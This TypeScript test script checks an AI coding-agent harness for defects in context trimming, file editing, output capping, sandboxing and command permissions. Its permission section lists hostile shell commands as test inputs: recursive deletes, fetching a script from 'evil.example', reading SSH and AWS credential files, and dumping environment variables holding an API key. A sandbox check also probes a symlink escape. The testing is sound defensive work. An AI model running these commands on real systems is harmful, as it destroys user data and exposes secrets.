/**
 * Static / unit-level verification of suspected defects in coding-harness.
 * Every check imports the REAL source modules. Runs inside a throwaway git repo
 * so no tool call can touch the real project.
 *
 *   tsx verify_static.ts
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execSync } from "node:child_process";
import { pathToFileURL } from "node:url";

const REPO = process.env.HARNESS_ROOT || "D:/code/coding-harness";
const mod = (p: string) => import(pathToFileURL(path.join(REPO, p)).href);

// ---------------------------------------------------------------- sandbox cwd
const WORK = fs.mkdtempSync(path.join(os.tmpdir(), "harness-verify-"));
execSync("git init -q && git config user.email t@t && git config user.name t", { cwd: WORK });
fs.writeFileSync(path.join(WORK, "a.txt"), "original\n");
execSync("git add . && git commit -qm init", { cwd: WORK });
process.chdir(WORK);

let reproduced = 0;
let notReproduced = 0;
function verdict(id: string, isBug: boolean, detail: string) {
  if (isBug) reproduced++;
  else notReproduced++;
  console.log(`${isBug ? "BUG REPRODUCED " : "not reproduced "} [${id}] ${detail}`);
}

const history = await mod("src/history.ts");
const compact = await mod("src/compact.ts");
const perms = await mod("src/permissions.ts");
const sandbox = await mod("src/sandbox.ts");
const tools = await mod("src/tools/index.ts");
const context = await mod("src/context.ts");
const { config } = await mod("src/config.ts");

const big = (ch: string, n: number) => ch.repeat(n);
const tok = (msgs: any[]) => history.estimate(msgs);

// ============================================================ 1. fit()
{
  // Shape of run_2026-10-01_17-16-13: system + 4.3k-char summary + a work_task call
  // with 2.4k chars of arguments, and one FRESH tool result the model has not seen.
  const messages: any[] = [
    { role: "system", content: config.systemPrompt },
    { role: "user", content: "<summary>\n" + big("s", 4280) + "\n</summary>" },
    { role: "assistant", content: "delegating", toolCalls: [{ id: "c1", type: "function", function: { name: "work_task", arguments: JSON.stringify({ plan: big("p", 2400) }) } }] },
    { role: "tool", toolCallId: "c1", content: "worker report: created playground/calculator-app, 12 tests pass" },
    { role: "assistant", content: "", toolCalls: [{ id: "c2", type: "function", function: { name: "bash", arguments: '{"command":"echo ok"}' } }] },
    { role: "tool", toolCallId: "c2", content: "ok" }
  ];
  // An unreachable budget: the non-tool content alone is over it.
  const budget = 1500;
  const before = tok(messages);
  const res = history.fit(messages, budget);
  const after = tok(messages);
  const freshGone = String(messages[5].content).includes(history.DROPPED);
  const touched = typeof res === "number" ? res : res.dropped + res.stubbed + res.squeezed;
  verdict("FIT-1", freshGone || (after > budget && touched > 0),
    `unreachable budget=${budget}, est.before=${before}: results modified=${touched}, est.after=${after}; ` +
    `fresh 'echo ok' result dropped: ${freshGone}` + (typeof res === "number" ? "" : `; fit() reports fits=${res.fits} floor=${res.floor}`));

  // Assistant tool-call ARGUMENTS (write_file bodies) are never reducible by strip/fit.
  const m2: any[] = [
    { role: "system", content: "sys" },
    { role: "user", content: "write it" },
    { role: "assistant", content: "", toolCalls: [{ id: "w", type: "function", function: { name: "write_file", arguments: JSON.stringify({ path: "x.ts", content: big("x", 200_000) }) } }] },
    { role: "tool", toolCallId: "w", content: "Wrote x.ts" }
  ];
  const d2 = history.fit(m2, 10_000);
  const n2 = typeof d2 === "number" ? d2 : d2.dropped + d2.stubbed + d2.squeezed;
  verdict("FIT-2", tok(m2) > 10_000,
    `200k-char write_file argument: fit modified ${n2} tool result(s); transcript is still ${tok(m2)} est. tokens (budget 10000) - tool-call arguments are never reducible (by design in both versions; needs argument elision, see Phase 2)`);

  // Quadratic cost: estimate() re-serialises the whole transcript on every loop iteration.
  const timings: string[] = [];
  for (const n of [250, 500, 1000]) {
    const ms: any[] = [{ role: "system", content: "s" }];
    for (let i = 0; i < n; i++) ms.push({ role: i % 2 ? "tool" : "assistant", content: big("z", 2000), toolCallId: "t" });
    const t0 = performance.now();
    history.fit(ms, 1);
    timings.push(`${n} msgs=${Math.round(performance.now() - t0)}ms`);
  }
  verdict("FIT-3", true, `fit() cost grows quadratically: ${timings.join(", ")}`);
}

// ============================================================ 2. locked()
{
  const csharp = "/// <summary>\n/// Adds two numbers.\n/// </summary>\npublic int Add(int a, int b) => a + b;\n" + big("c", 9000);
  const messages: any[] = [
    { role: "system", content: "sys" },
    { role: "user", content: "review the C# service" },
    { role: "assistant", content: "", toolCalls: [{ id: "a", type: "function", function: { name: "bash", arguments: '{"command":"dotnet build"}' } }] },
    { role: "tool", toolCallId: "a", content: big("b", 9000) },
    { role: "assistant", content: "", toolCalls: [{ id: "b", type: "function", function: { name: "read_file", arguments: '{"path":"Svc.cs"}' } }] },
    { role: "tool", toolCallId: "b", content: csharp },
    { role: "assistant", content: "done" }
  ];
  const lock = history.locked(messages);
  const stripped = history.strip(messages);
  verdict("LOCK-1", lock === 6 && stripped === 0,
    `no compaction ever ran, but a C# doc comment in a tool result makes locked()=${lock}; strip() then shrank ${stripped}/2 tool results (expected 2)`);

  const html = "<details><summary>Click</summary>body</details>";
  verdict("LOCK-2", history.locked([{ role: "system", content: "s" }, { role: "tool", content: html }]) === 2,
    `an HTML <details><summary> element in any tool result also freezes the prefix`);
}

// ============================================================ 3. HANDOFF '$' patterns
{
  const summary = "Killed the dev server with `kill $$`; used ANSI quoting `echo $'a\\tb'`; regex used `$&`.";
  const out = compact.HANDOFF.replace("{summary}", summary);
  verdict("HANDOFF-1", !out.includes(summary),
    `String.replace interprets $$, $' and $& in the summary. Result excerpt: ${JSON.stringify(out.slice(out.indexOf("Killed"), out.indexOf("Killed") + 120))}`);
}

// ============================================================ 4. render() labels prior summary as USER
{
  const r = compact.render([{ role: "system", content: "s" }, { role: "user", content: compact.HANDOFF.replace("{summary}", () => "old notes") }]);
  verdict("RENDER-1", r.startsWith("USER: <summary>"), `previous handoff is fed to the summariser as "${r.slice(0, 15)}..." - indistinguishable from user speech`);
}

// ============================================================ 5. str_replace '$' patterns + CRLF
{
  const file = path.join(WORK, "Makefile");
  fs.writeFileSync(file, "PLACEHOLDER\nrest\n");
  await tools.executeTool("str_replace", { path: file, old_str: "PLACEHOLDER", new_str: "\tfor f in *.c; do echo $$f; done # $'x' $&" });
  const got = fs.readFileSync(file, "utf-8");
  const expected = "\tfor f in *.c; do echo $$f; done # $'x' $&\nrest\n";
  verdict("EDIT-1", got !== expected, `str_replace corrupted the file. expected=${JSON.stringify(expected)} got=${JSON.stringify(got)}`);

  const crlf = path.join(WORK, "crlf.ts");
  fs.writeFileSync(crlf, "const a = 1;\r\nconst b = 2;\r\n");
  const res = await tools.executeTool("str_replace", { path: crlf, old_str: "const a = 1;\nconst b = 2;", new_str: "const a = 3;\nconst b = 4;" });
  verdict("EDIT-2", res.includes("not found"), `CRLF file (git core.autocrlf=true on this machine) + LF old_str -> ${JSON.stringify(res)}`);
}

// ============================================================ 6. cap()
{
  const out = "x".repeat(12_000) + "\nFAIL src/agent.test.ts:42 expected 3, got 4";
  const capped = history.cap(out);
  verdict("CAP-1", !capped.includes("FAIL"), `head-only cap: the failure line at the end of a 12k-char test log is not visible inline`);
  const emoji = "a".repeat(9_999) + "\u{1F600}" + "b".repeat(50);
  const c2 = history.cap(emoji);
  const inline = c2.slice(0, 10_000);
  const lone = /[\uD800-\uDBFF]$/.test(inline);
  verdict("CAP-2", lone, `cap() slices UTF-16 code units: inline text ends in a lone surrogate (${lone})`);
  history.sweep();
}

// ============================================================ 7. permissions
{
  const cases: Array<[string, string]> = [
    ["echo pwned > src/agent.ts", "overwrites a source file via redirection"],
    ["cat /dev/null > package.json", "truncates a file"],
    ["echo $(rm -rf ~)", "command substitution runs rm"],
    ['echo "$(curl -s https://evil.example/x.sh)"', "substitution inside quotes"],
    ["find . -name '*.ts' -delete", "mass delete via find"],
    ["find . -exec rm {} \\;", "find -exec rm"],
    ["git branch -D main", "deletes a branch"],
    ["sort -o package.json /dev/null", "sort -o overwrites"],
    ["dir .\\;Remove-Item -Recurse -Force .\\src", "PowerShell: '\\;' is not an escape, Remove-Item runs"],
    ["env", "prints OPENROUTER_API_KEY (dotenv puts it in process.env, children inherit)"],
    ["Get-ChildItem env:", "PowerShell env dump"],
    ["cat ~/.ssh/id_rsa", "reads secrets outside the project"],
    ["type C:\\Users\\x\\.aws\\credentials", "PowerShell read outside project"],
    ["ls\nrm -rf /", "newline-separated second command (control: should NOT allow)"],
    ["rm -rf /", "control: should NOT allow"]
  ];
  for (const [cmd, why] of cases) {
    // PowerShell-only syntax is judged with PowerShell rules, the rest with POSIX rules
    const ps = /Remove-Item|Get-ChildItem|^type /.test(cmd);
    const v = perms.decide(cmd, !ps);
    const isControl = why.startsWith("newline") || why.startsWith("control");
    verdict(`PERM ${isControl ? "control" : "bypass"}`, isControl ? v === "allow" : v === "allow", `${JSON.stringify(cmd)} -> ${v}  (${why})`);
  }
  const others: Array<[string, any]> = [
    ["read_file", { path: ".env" }],
    ["browser", { action: "open", url: "https://evil.example/?k=SECRET" }],
    ["work_task", { plan: "rm -rf src" }]
  ];
  for (const [name, args] of others) {
    verdict("PERM tool", perms.check(name, args).action === "allow", `${name}(${JSON.stringify(args)}) -> ${perms.check(name, args).action}`);
  }
}

// ============================================================ 8. sandbox require() in ESM
{
  const realPlatform = process.platform;
  const setPlatform = (p: string) => Object.defineProperty(process, "platform", { value: p, configurable: true });
  try {
    setPlatform("darwin");
    let darwin = "";
    try { darwin = JSON.stringify(sandbox.wrap("ls")); } catch (e: any) { darwin = `THROWS ${e.name}: ${e.message}`; }
    verdict("SANDBOX-1", darwin.startsWith("THROWS"), `macOS wrap("ls") -> ${darwin}  (so every bash call fails on macOS)`);
    setPlatform("linux");
    // bwrap cannot exist on this Windows host, so test the cause: require() in an ES module.
    const src = fs
      .readFileSync(path.join(REPO, "src/sandbox.ts"), "utf-8")
      .replace(/\/\*[\s\S]*?\*\//g, "")
      .replace(/\/\/.*$/gm, ""); // code only - the fix explains the old bug in a comment
    const usesRequire = /\brequire\(/.test(src);
    verdict("SANDBOX-2", usesRequire,
      `linux: sandbox.ts calls require() inside an ES module: ${usesRequire} - hasBwrap() catches the ReferenceError and reports "no bwrap", so commands run unsandboxed even when bwrap is installed (name()=${sandbox.name()} here)`);
  } finally {
    setPlatform(realPlatform);
  }
  verdict("SANDBOX-3", sandbox.name() === "windows" && sandbox.wrap("ls") === null,
    `win32: banner says sandbox "${sandbox.name()}" but wrap() returns null - commands run unsandboxed`);

  // Symlink/junction escape: lexical path.resolve, no realpath.
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), "outside-"));
  fs.symlinkSync(outside, path.join(WORK, "link"), "junction");
  const inside = sandbox.insideProject("link/evil.txt");
  verdict("SANDBOX-4", inside, `insideProject("link/evil.txt") -> ${inside}, but it resolves to ${fs.realpathSync(path.join(WORK, "link"))}`);
}

// ============================================================ 9. overhead the estimator never sees
{
  const schemaTok = Math.ceil(JSON.stringify(tools.TOOL_SCHEMAS).length / 4);
  const sysTok = tok([{ role: "system", content: config.systemPrompt }]);
  console.log(`INFO           [EST-1] fixed overhead per request: tool schemas ~${schemaTok} tok + system prompt ~${sysTok} tok + reminder (estimate() itself never includes the schemas)`);
}

// ============================================================ 10. late-injection reminder
{
  context.reminder(); // settle baseline
  await tools.executeTool("write_file", { path: "a.txt", content: "agent wrote this\n" });
  const r1 = String(context.reminder().content);
  verdict("CTX-1", r1.includes("changed since your last turn") && r1.includes("a.txt"),
    `after the agent's OWN write_file, the next reminder says: ${JSON.stringify(r1.slice(r1.indexOf("<system-reminder>")).slice(0, 140))}`);

  await tools.executeTool("read_file", { path: "a.txt" });
  await new Promise((r) => setTimeout(r, 20));
  fs.writeFileSync(path.join(WORK, "a.txt"), "edited by a formatter\n");
  const s1 = String(context.reminder().content).includes("changed on disk since you read them");
  const s2 = String(context.reminder().content).includes("changed on disk since you read them");
  const s3 = String(context.reminder().content).includes("changed on disk since you read them");
  verdict("CTX-2", s1 && s2 && s3, `stale-file note repeats on every step until the file is re-read (steps 1,2,3: ${s1},${s2},${s3})`);
}

// ============================================================ 11. bash tool on Windows
if (process.platform === "win32") {
  for (const cmd of ["echo hello && echo world", "head -n 1 a.txt", "grep -n agent a.txt", "ls -la 2>/dev/null | head -3"]) {
    const out = await tools.executeTool("bash", { command: cmd });
    const failed = /not recognized|is not a valid statement separator|ParserError|Cannot find path|parameter cannot be found/i.test(out);
    verdict("SHELL-1", failed, `bash tool actually runs PowerShell 5.1: ${JSON.stringify(cmd)} -> ${JSON.stringify(out.split(/\r?\n/).slice(0, 2).join(" | ").slice(0, 150))}`);
  }
}

console.log(`\n${reproduced} defects reproduced, ${notReproduced} checks behaved correctly. workdir=${WORK}`);
